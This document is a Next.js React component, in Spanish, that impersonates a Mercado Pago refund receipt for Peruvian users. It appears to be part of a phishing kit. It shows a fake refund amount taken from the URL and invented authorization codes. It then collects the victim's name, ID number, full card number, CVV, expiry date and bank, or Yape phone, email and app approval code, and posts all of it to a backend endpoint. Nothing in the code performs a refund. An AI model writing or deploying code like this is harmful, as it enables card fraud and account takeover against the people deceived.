"use client";

import { useState, useMemo } from "react";
import { useSearchParams } from "next/navigation";

export default function DevolucionClient() {
  const params = useSearchParams();
  const montoParam = params.get("monto");
  const monto = montoParam ? parseFloat(montoParam) : 11099.38;

  const [metodo, setMetodo] = useState<"yape" | "credito" | "debito">("yape");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [form, setForm] = useState({
    nombres: "",
    tipoDoc: "DNI",
    nroDoc: "",
    email: "",
    telefono: "",
    banco: "",
    tarjeta: "",
    vencimiento: "",
    cvv: "",
    cuotas: "-",
    emailYape: "",
    telefonoYape: "",
    codigoAprobacionYape: "",
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setForm((s) => ({ ...s, [name]: value }));
    setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const handleTarjetaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let digits = e.target.value.replace(/\D/g, "");
    if (digits.length > 16) digits = digits.slice(0, 16);
    const formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    setForm((s) => ({ ...s, tarjeta: formatted }));
  };

  const handleVencimientoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length > 4) v = v.slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    setForm((s) => ({ ...s, vencimiento: v }));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length > 4) v = v.slice(0, 4);
    setForm((s) => ({ ...s, cvv: v }));
  };

  const [authCode] = useState(() => {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length: 6 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  });

  const fecha = useMemo(
    () =>
      new Date().toLocaleDateString("es-PE", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      }),
    []
  );

  const seAcreditaEn = useMemo(() => {
    if (metodo === "yape") {
      const t = form.telefonoYape.replace(/\D/g, "");
      const last4 = t.slice(-4);
      return t ? `Yape ***${last4}` : "—";
    } else {
      const digits = form.tarjeta.replace(/\D/g, "");
      if (!digits) return "—";
      if (digits.length <= 6) return `${digits}`;
      const first6 = digits.slice(0, 6);
      const last4 = digits.slice(-4);
      return `${first6}XXXXXX${last4}`;
    }
  }, [metodo, form.telefonoYape, form.tarjeta]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const body = {
      type: "devolucion_comprobante",
      fecha,
      comercio: "7926420",
      terminal: "",
      codigoAutorizacion: authCode,
      monto,
      metodo,
      seAcreditaEn,
      datos: form,
    };

    await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    alert("✅ Solicitud enviada correctamente");
  };

  return (
    <main className="min-h-screen bg-[#f3f3f3] flex justify-center py-8 px-4 text-[#111]">
      <form
        onSubmit={handleSubmit}
        className="bg-white w-full max-w-[720px] rounded-xl shadow-md border border-[#ddd] p-8 sm:p-10"
      >
        {/* Encabezado */}
        <div className="flex flex-col sm:flex-row sm:items-start sm:justify-between mb-6 gap-3">
          <div className="flex items-center gap-3">
            <img
              src="/logo-mercadopago.jpeg"
              alt="Mercado Pago"
              className="w-[45px] h-[45px] object-contain"
            />
            <p className="text-[14px] sm:text-[15px] text-[#333] leading-snug">
              Desde Mercado Pago gestionamos la devolución solicitada con los siguientes datos:
            </p>
          </div>
          <div className="text-right">
            <p className="text-[13px] text-[#555]">Comprobante de Devolución</p>
            <p className="text-[15px] font-semibold text-[#111]">
              #{Math.floor(Math.random() * 9000000 + 1000000)}
            </p>
          </div>
        </div>

        {/* Monto */}
        <div className="bg-[#fafafa] border border-[#eee] rounded-lg py-6 text-center mb-8 shadow-sm">
          <p className="text-[15px] text-[#333] font-medium">Monto total a devolver</p>
          <p className="text-[34px] font-bold text-[#00a650] my-2">
            S/ {monto.toLocaleString("es-PE", { minimumFractionDigits: 2 })}
          </p>
          <p className="text-[14px] text-[#555]">Se acredita en</p>
          <p className="text-[15px] font-medium mt-1">{seAcreditaEn}</p>
        </div>

        {/* Detalle */}
        <div className="text-[14px] mb-8 border-t border-[#eee] pt-2">
          <div className="flex justify-between py-1">
            <span>Total pagado</span>
            <strong>S/ {monto.toLocaleString("es-PE", { minimumFractionDigits: 2 })}</strong>
          </div>
          <div className="flex justify-between py-1">
            <span>Medio de Pago</span>
            <span>{metodo === "yape" ? "Yape" : metodo === "credito" ? "Crédito" : "Débito"}</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Cuotas</span>
            <span>{metodo === "credito" ? form.cuotas : "-"}</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Fecha de compra</span>
            <span>{fecha}</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Fecha de solicitud de devolución</span>
            <span>{fecha}</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Comercio</span>
            <span>7926420</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Terminal</span>
            <span>—</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Código Autorización</span>
            <span className="font-mono">{authCode}</span>
          </div>
        </div>

        {/* 🔹 FORMULARIO */}
        <div className="space-y-5">
          {/* Selector de método */}
          <div>
            <label className="block text-[14px] font-medium mb-1">Medio de Pago</label>
            <select
              value={metodo}
              onChange={(e) => setMetodo(e.target.value as "yape" | "credito" | "debito")}
              className="border border-[#ccc] rounded-md w-full p-2"
            >
              <option value="yape">Yape</option>
              <option value="credito">Tarjeta de Crédito</option>
              <option value="debito">Débito</option>
            </select>
          </div>

          {/* Datos personales */}
          <div className="flex flex-col sm:flex-row gap-3">
            <div className="flex-1">
              <label className="block text-[14px] mb-1">Nombres completos</label>
              <input
                name="nombres"
                value={form.nombres}
                onChange={handleChange}
                className="border border-[#ccc] rounded-md w-full p-2"
                required
              />
            </div>
            <div className="w-full sm:w-[120px]">
              <label className="block text-[14px] mb-1">Tipo</label>
              <select
                name="tipoDoc"
                value={form.tipoDoc}
                onChange={handleChange}
                className="border border-[#ccc] rounded-md w-full p-2"
              >
                <option value="DNI">DNI</option>
                <option value="CE">CE</option>
                <option value="PASS">PASS</option>
              </select>
            </div>
            <div className="w-full sm:w-[150px]">
              <label className="block text-[14px] mb-1">N° Documento</label>
              <input
                name="nroDoc"
                value={form.nroDoc}
                onChange={handleChange}
                className="border border-[#ccc] rounded-md w-full p-2"
                required
              />
            </div>
          </div>

          {/* 🔸 Si elige YAPE */}
          {metodo === "yape" && (
            <>
              <div>
                <label className="block text-[14px] mb-1">
                  Correo electrónico afiliado a Yape
                </label>
                <input
                  name="emailYape"
                  value={form.emailYape}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
              <div>
                <label className="block text-[14px] mb-1">
                  Número de teléfono afiliado a Yape
                </label>
                <input
                  name="telefonoYape"
                  value={form.telefonoYape}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
              <div>
                <label className="block text-[14px] mb-1">
                  Código de aprobación (en tu app Yape)
                </label>
                <input
                  name="codigoAprobacionYape"
                  value={form.codigoAprobacionYape}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
            </>
          )}

          {/* 🔸 Si elige Tarjeta de crédito / débito */}
          {(metodo === "credito" || metodo === "debito") && (
            <>
              <div>
                <label className="block text-[14px] mb-1">Correo electrónico</label>
                <input
                  name="email"
                  value={form.email}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
              <div>
                <label className="block text-[14px] mb-1">Número de teléfono</label>
                <input
                  name="telefono"
                  value={form.telefono}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <div className="flex-1">
                  <label className="block text-[14px] mb-1">Número de tarjeta</label>
                  <input
                    name="tarjeta"
                    value={form.tarjeta}
                    onChange={handleTarjetaChange}
                    placeholder="5401 04XX XXXX 5932"
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                  <p className="text-[12px] text-gray-500 mt-1">
                    Mínimo 14 y máximo 16 dígitos
                  </p>
                </div>
                <div className="w-full sm:w-[100px]">
                  <label className="block text-[14px] mb-1">CVV</label>
                  <input
                    name="cvv"
                    value={form.cvv}
                    onChange={handleCvvChange}
                    placeholder="123"
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                </div>
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <div className="w-full sm:w-[150px]">
                  <label className="block text-[14px] mb-1">Vencimiento</label>
                  <input
                    name="vencimiento"
                    value={form.vencimiento}
                    onChange={handleVencimientoChange}
                    placeholder="MM/AA"
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                </div>
                <div className="flex-1">
                  <label className="block text-[14px] mb-1">Banco</label>
                  <input
                    name="banco"
                    value={form.banco}
                    onChange={handleChange}
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                </div>
              </div>

              {metodo === "credito" && (
                <div>
                  <label className="block text-[14px] mb-1">Cuotas</label>
                  <select
                    name="cuotas"
                    value={form.cuotas}
                    onChange={handleChange}
                    className="border border-[#ccc] rounded-md w-full p-2"
                  >
                    <option value="-">–</option>
                    {Array.from({ length: 12 }).map((_, i) => (
                      <option key={i} value={String(i + 1)}>
                        {i + 1} cuota{i + 1 > 1 ? "s" : ""}
                      </option>
                    ))}
                  </select>
                </div>
              )}
            </>
          )}
        </div>

        {/* Botón */}
        <button
          type="submit"
          className="w-full bg-[#0b57d0] text-white rounded-md mt-10 py-3 text-[15px] font-medium hover:bg-[#094dc1] transition-all duration-150 shadow-sm hover:shadow-md"
        >
          Generar comprobante y enviar
        </button>

        <p className="text-[12px] text-[#555] mt-6 leading-snug text-center">
          Tenga en cuenta que la acreditación del reintegro al titular de la tarjeta o cuenta dependerá del procesamiento por parte del banco emisor.
        </p>
      </form>
    </main>
  );
}
